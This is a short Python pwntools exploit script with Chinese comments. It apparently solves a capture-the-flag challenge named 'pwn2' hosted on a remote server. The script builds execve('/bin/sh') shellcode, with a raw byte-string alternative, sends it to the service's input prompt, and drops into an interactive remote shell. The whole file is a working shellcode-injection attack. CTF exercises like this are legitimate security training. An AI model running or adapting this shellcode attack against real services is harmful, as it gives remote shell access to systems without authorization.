#!/usr/bin/env python3
from pwn import *

# 设置目标程序
context(os='linux', arch='amd64') # 非常重要！指定架构为64位
# p = process('./pwn2')           # 用于本地测试
p = remote('gz.imxbt.cn',20210)     # 用于连接远程服务器

# 生成一段调用 execve("/bin/sh", 0, 0) 的shellcode
shellcode = asm(shellcraft.sh())
# shellcraft.sh() 是pwntools提供的生成/bin/sh shellcode的函数
# asm() 将汇编指令转换为机器码

# 或者，你也可以使用手工优化后的经典shellcode（长度更短）
# shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# 接收提示信息
print(p.recvuntil(b"please input shellcode: "))

# 发送我们生成的shellcode
p.send(shellcode)

# 交互模式，让你可以与被攻破的shell进行交互
p.interactive()